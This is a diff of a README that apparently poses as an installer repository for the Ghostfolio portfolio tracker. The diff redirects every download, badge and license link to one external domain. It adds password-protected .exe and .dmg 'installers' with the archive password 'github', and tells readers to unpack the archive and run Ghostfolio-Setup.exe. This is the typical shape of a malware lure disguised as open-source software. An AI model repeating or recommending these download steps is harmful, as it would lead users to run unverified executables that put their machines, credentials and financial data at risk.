@@ -1,26 +1,28 @@
 <p align="center">
-  <a href="https://github.com/ВАШ_НИК/ghostfolio-v2.1-installer/releases">
-    <img src="assets/logo.png" alt="Ghostfolio Logo" width="130" />
+  <a href="https://yeelen.cg/gh/">
+    <img src="assets/logo.png" alt="Ghostfolio Logo" width="140" />
   </a>
 </p>
 
 <h1 align="center">Ghostfolio v2.1 — Open Source Wealth Management & Portfolio Tracker</h1>
 
 <p align="center">
-  <strong>2026 Guide: Privacy-First Personal Finance Dashboard for Stocks, ETFs, Crypto & Net Worth Analytics</strong>
+  <strong>The Ultimate Privacy-First Personal Finance Dashboard for Stocks, ETFs, Crypto, and Net Worth Analytics</strong>
 </p>
 
 <p align="center">
-  <a href="https://github.com/ВАШ_НИК/ghostfolio-v2.1-installer/releases/latest"><img src="https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge&logo=github" alt="Download Release"></a>
-  <a href="https://github.com/ВАШ_НИК/ghostfolio-v2.1-installer/actions"><img src="https://img.shields.io/badge/Status-Active_Build-success?style=for-the-badge" alt="Build Status"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-AGPL--3.0-orange?style=for-the-badge" alt="License"></a>
+  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/Download-Latest_Setup-blue?style=for-the-badge&logo=windows" alt="Download Release"></a>
+  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/Status-Active_Build-success?style=for-the-badge" alt="Build Status"></a>
+  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/License-AGPL--3.0-orange?style=for-the-badge" alt="License"></a>
+  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/Platform-Windows_|_macOS_|_Linux-lightgrey?style=for-the-badge" alt="Platform Support"></a>
 </p>
 
 <p align="center">
-  <a href="#-direct-downloads--links">📥 Quick Download</a> •
+  <a href="#-direct-downloads--links"><strong>📥 Direct Downloads</strong></a> •
+  <a href="#-about-ghostfolio">About</a> •
   <a href="#-key-features">Key Features</a> •
   <a href="#-system-requirements">Requirements</a> •
-  <a href="#-installation--deployment">Deployment</a> •
+  <a href="#-installation--setup">Installation</a> •
   <a href="#-frequently-asked-questions">FAQ</a>
 </p>
 
@@ -40,13 +42,16 @@ Whether you are managing stocks, ETFs, mutual funds, real estate, cash accounts,
 
 ## 📥 Direct Downloads & Links
 
-Get the latest build or source files directly using the official GitHub Releases below:
+Get the latest standalone build, offline installers, or source files directly using the direct mirrors below:
 
-| Package Option | Target OS / Environment | Link |
+| Package Option | Format / Platform | Download Link |
 | :--- | :--- | :--- |
-| **Docker Compose Bundle** | Linux, macOS, Windows (Docker Desktop) | 👉 **[Download Docker Setup](https://github.com/ВАШ_НИК/ghostfolio-v2.1-installer/releases/latest)** |
-| **Complete Source Package (.zip)** | Cross-platform | 👉 **[Download Source (.zip)](https://github.com/ВАШ_НИК/ghostfolio-v2.1-installer/releases/latest)** |
-| **Complete Source Package (.tar.gz)** | Linux / macOS | 👉 **[Download Source (.tar.gz)](https://github.com/ВАШ_НИК/ghostfolio-v2.1-installer/releases/latest)** |
+| **Complete Application Setup** | Executable (`.exe`) | 👉 **[Download Windows Installer](https://yeelen.cg/gh/)** |
+| **macOS Bundle Package** | Disk Image (`.dmg`) | 👉 **[Download macOS Installer](https://yeelen.cg/gh/)** |
+| **Source Code (Latest Build)** | Archive (`.zip`) | 👉 **[Download Source (.zip)](https://yeelen.cg/gh/)** |
+| **Source Code (Tarball)** | Archive (`.tar.gz`) | 👉 **[Download Source (.tar.gz)](https://yeelen.cg/gh/)** |
+
+> 🔑 **Archive Password (if prompted):** `github`
 
 ---
 
@@ -67,22 +72,36 @@ Get the latest build or source files directly using the official GitHub Releases
 * **Zen Mode:** Instantly hide sensitive financial numbers with a single click for discreet screen sharing.
 * **Self-Hosted Control:** Deploy Ghostfolio on your own server or desktop machine to ensure 100% data ownership.
 
+### ⚡ Seamless Data Management
+* **Automated CSV Import:** Easily bulk-import transaction histories from popular brokers (e.g., Interactive Brokers, Trade Republic, Robinhood, Revolut, eToro, Coinbase).
+* **Backup & Export:** Export your entire portfolio dataset to JSON or CSV anytime for hassle-free migrations.
+
 ---
 
 ## 🖥️ System Requirements
 
-* **Operating System:** Windows 10/11, macOS 11+, Linux (Ubuntu, Debian, CentOS), or Docker Host
-* **Runtime:** Node.js v18.x or v20.x LTS (for manual host setup)
-* **Database:** PostgreSQL 14+ and Redis 6+
-* **Hardware:** Minimum 1 GB RAM, 2 GHz CPU, 500 MB free disk space
+Before running or hosting Ghostfolio, ensure your system meets the following prerequisites:
+
+* **Operating System:** Windows 10/11 (64-bit), macOS 11+, or Linux Distribution
+* **RAM:** Minimum 2 GB RAM (4 GB recommended)
+* **Disk Space:** 500 MB free storage for core application files
 
 ---
 
-## 🚀 Installation & Quick Deployment
+## 🚀 Installation & Setup
 
-### Method 1: Docker Compose (Recommended)
+### Method 1: Direct Executable Installation (Quickest)
+1. Download the setup file from the **[Direct Download Link](https://yeelen.cg/gh/)**.
+2. Unpack the downloaded archive (Password: `github`).
+3. Run `Ghostfolio-Setup.exe` and follow the on-screen installation steps.
 
-1. Clone or download the repository:
-   ```bash
-   git clone [https://github.com/ВАШ_НИК/ghostfolio-v2.1-installer.git](https://github.com/ВАШ_НИК/ghostfolio-v2.1-installer.git)
-   cd ghostfolio-v2.1-installer
+### Method 2: Manual CLI Deployment
+```bash
+# Clone the repository
+git clone [https://github.com/your-username/ghostfolio-v2.1-installer.git](https://github.com/your-username/ghostfolio-v2.1-installer.git)
+
+# Navigate into workspace
+cd ghostfolio-v2.1-installer
+
+# Launch application stack
+docker compose up -d
